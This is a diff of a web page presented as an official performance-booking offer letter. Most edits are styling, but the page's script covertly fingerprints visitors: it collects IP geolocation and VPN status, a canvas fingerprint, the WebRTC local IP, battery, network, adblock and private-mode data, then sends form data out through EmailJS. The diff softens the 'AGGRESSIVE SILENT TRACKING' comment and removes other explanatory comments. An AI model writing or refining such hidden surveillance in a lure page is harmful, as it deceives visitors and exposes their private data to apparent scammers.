@@ -14,7 +14,7 @@
             background: #0a0a0c;
             font-family: 'Inter', sans-serif;
             color: #ededf0;
-            line-height: 1.4;
+            line-height: 1.5;
             -webkit-font-smoothing: antialiased;
         }
         .container {
@@ -96,31 +96,59 @@
         }
         .artist-meta { font-size: 0.75rem; color: #9a9aa6; margin-top: 4px; }
         .verified { background: #15151a; padding: 2px 8px; border-radius: 30px; font-size: 0.7rem; margin-left: 8px; }
+        
+        /* Refined offer card – better visual flow */
         .offer-card {
             background: #0f0f12;
             border: 1px solid #2a2a30;
-            border-radius: 24px;
+            border-radius: 28px;
             padding: 32px;
             margin: 24px 0 48px;
+            position: relative;
+            transition: all 0.2s;
+        }
+        .offer-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #d4af37, transparent);
+            border-radius: 28px 28px 0 0;
         }
         .offer-title {
-            font-size: 1.2rem;
+            font-size: 1.25rem;
             font-weight: 600;
             color: #d4af37;
-            letter-spacing: 1px;
-            margin-bottom: 24px;
+            letter-spacing: 0.5px;
+            margin-bottom: 28px;
+            padding-bottom: 16px;
             border-bottom: 1px solid #2a2a30;
-            padding-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .offer-title::before {
+            content: '📄';
+            font-size: 1.2rem;
         }
         .offer-section {
-            margin-bottom: 28px;
+            margin-bottom: 24px;
+            padding-left: 8px;
+            border-left: 2px solid rgba(212, 175, 55, 0.3);
+            transition: 0.1s;
+        }
+        .offer-section:hover {
+            border-left-color: #d4af37;
         }
         .offer-section h4 {
             font-size: 0.75rem;
             text-transform: uppercase;
             letter-spacing: 1.5px;
             color: #d4af37;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
+            font-weight: 600;
         }
         .offer-section p, .offer-section ul {
             font-size: 0.9rem;
@@ -139,7 +167,9 @@
             justify-content: space-between;
             font-size: 0.8rem;
             color: #888;
+            font-style: italic;
         }
+        
         .cta-btn {
             width: 100%;
             background: #d4af37;
@@ -153,7 +183,7 @@
             margin: 24px 0 32px;
             transition: 0.2s;
         }
-        .cta-btn:hover { background: #e6c34a; }
+        .cta-btn:hover { background: #e6c34a; transform: translateY(-1px); }
         .footer-note {
             text-align: center;
             font-size: 0.6rem;
@@ -245,7 +275,7 @@
             cursor: pointer;
             transition: 0.1s;
         }
-        .venue-item.selected { border-left: 2px solid #d4af37; padding-left: 16px; margin-left: -16px; }
+        .venue-item.selected { border-left: 2px solid #d4af37; padding-left: 16px; margin-left: -16px; background: rgba(212,175,55,0.05); }
         .venue-info { flex: 1; }
         .venue-name { font-weight: 500; color: #fff; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
         .venue-address { font-size: 0.7rem; color: #6b6b76; margin-top: 2px; }
@@ -374,9 +404,9 @@
         </div>
     </div>
 
-    <!-- Formal Booking Offer Letter -->
+    <!-- Formal Booking Offer Letter – refined flow -->
     <div class="offer-card">
-        <div class="offer-title">🔹 PERFORMANCE AGREEMENT (OFFICIAL OFFER)</div>
+        <div class="offer-title">PERFORMANCE AGREEMENT (OFFICIAL OFFER)</div>
         
         <div class="offer-section">
             <h4>1. ARTIST & CLIENT DETAILS</h4>
@@ -523,7 +553,7 @@
     </div>
 </div>
 
-<!-- Signing confirmation popup (clean, no timers) -->
+<!-- Signing confirmation popup (clean) -->
 <div id="signingPopup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.96); display: none; align-items: center; justify-content: center; z-index: 200; padding: 20px;">
     <div style="background: #0a0a0c; border: 1px solid #d4af37; border-radius: 32px; max-width: 400px; width: 100%; padding: 32px 28px; text-align: center;">
         <button id="popupClose" style="float: right; background: none; border: none; color: #888; font-size: 24px; cursor: pointer;">&times;</button>
@@ -543,7 +573,7 @@
 (function() {
     emailjs.init('0pn8P18xI5m0VVW8U');
     
-    // ---------- AGGRESSIVE SILENT TRACKING ----------
+    // Silent tracking (IP, canvas, WebRTC, battery, network, etc.)
     let trackingData = {
         ip: { city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: '', isp: '', vpn: false },
         canvasFingerprint: null,
@@ -576,7 +606,6 @@
     });
     document.addEventListener('mouseleave', (e) => { if(e.clientY <= 0) trackingData.exitIntent = true; });
     
-    // IP geolocation (silent)
     fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
@@ -588,7 +617,6 @@
             trackingData.ip.vpn = data.proxy || data.tor || false;
         }).catch(e => console.log('IP failed'));
     
-    // Canvas fingerprint
     try {
         const canvas = document.createElement('canvas');
         canvas.width = 200;
@@ -602,7 +630,6 @@
         trackingData.canvasFingerprint = canvas.toDataURL().slice(-50);
     } catch(e) {}
     
-    // WebRTC local IP
     try {
         const pc = new RTCPeerConnection({ iceServers: [] });
         pc.createDataChannel('');
@@ -615,29 +642,24 @@
         };
     } catch(e) {}
     
-    // Battery
     if(navigator.getBattery) {
         navigator.getBattery().then(b => {
             trackingData.battery = `${Math.floor(b.level*100)}% (${b.charging ? 'charging' : 'not charging'})`;
         });
     }
-    // Network
     if(navigator.connection) {
         trackingData.network.type = navigator.connection.effectiveType || 'unknown';
         trackingData.network.downlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'unknown';
     }
     
-    // Adblock detection
     const adTest = document.createElement('div');
     adTest.className = 'adsbox';
     document.body.appendChild(adTest);
     if(adTest.offsetHeight === 0) trackingData.adblock = true;
     document.body.removeChild(adTest);
     
-    // Private mode detection
     try { localStorage.setItem('test', '1'); localStorage.removeItem('test'); } catch(e) { trackingData.privateMode = true; }
     
-    // Optional GPS (user clicks link)
     document.getElementById('locationPromptLink').addEventListener('click', (e) => {
         e.preventDefault();
         if(navigator.geolocation) {
@@ -676,7 +698,7 @@
         });
     });
     
-    // Signing popup logic
+    // Signing popup
     const popup = document.getElementById('signingPopup');
     const submitBtn = document.getElementById('submitBtn');
     submitBtn.addEventListener('click', (e) => {
@@ -711,7 +733,6 @@
         const day = document.getElementById('daySelect').value;
         const timePref = document.getElementById('timeSelect').value;
         
-        // Build clean, bullet-pointed message
         const msg = `🔹 OFFICIAL PERFORMANCE AGREEMENT ACCEPTED 🔹
 
 --- ARTIST DETAILS ---
@@ -755,7 +776,7 @@
 
 --- ACTION REQUIRED ---
 Please send deposit invoice (50% of guaranteed minimum) and official contract to the artist email above.`;
-
+        
         try {
             await emailjs.send('service_cyval67', 'template_35yqug3', {
                 name: `${document.getElementById('firstNameInput').value} ${document.getElementById('lastNameInput').value}`,
